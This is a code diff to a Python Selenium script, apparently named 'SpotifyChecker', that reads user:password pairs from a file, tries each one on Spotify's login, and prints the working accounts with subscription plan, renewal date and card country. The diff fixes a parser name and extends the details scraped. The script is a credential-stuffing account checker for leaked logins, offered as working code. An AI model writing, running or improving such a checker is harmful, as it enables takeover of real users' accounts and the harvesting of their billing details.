@@ -1,8 +1,7 @@
 from selenium import webdriver
 import time
 from bs4 import BeautifulSoup
-driver = webdriver.Firefox()
-
+driver = webdriver.Firefox(executable_path='/Volumes/Data/Downloads/geckodriver/geckodriver')
 
 def check(user, password):
     """check if the combination works"""
@@ -22,13 +21,15 @@ def check(user, password):
     time.sleep(2)
 
     driver.get("https://www.spotify.com/us/account/overview/")
-    parse = BeautifulSoup(driver.page_source, 'html-parser')
+    parse = BeautifulSoup(driver.page_source, 'html.parser')
     for h3 in parse.find_all('h3', {'class': "product-name"}):
-        print('{}:{}:{}'.format(user, password, h3.get_text()))
+        for b in parse.find_all('b', {'class': "recurring-date"}):
+            for p in parse.find_all('p', {'id': "card-profile-country"}):
+                print('{}:{}:{}:{}:{}'.format(user, password, h3.get_text(), b.get_text(), p.get_text()))
 
     driver.delete_all_cookies()
 
-with open('/Users/hamza/Dropbox/MyPyProjects/spotify.txt') as s:
+with open('/Users/astronyu/Documents/SpotifyChecker/spotify.txt') as s:
     for line in s:
         users, passwords = line.split(':')
         check(users.strip(), passwords.strip())
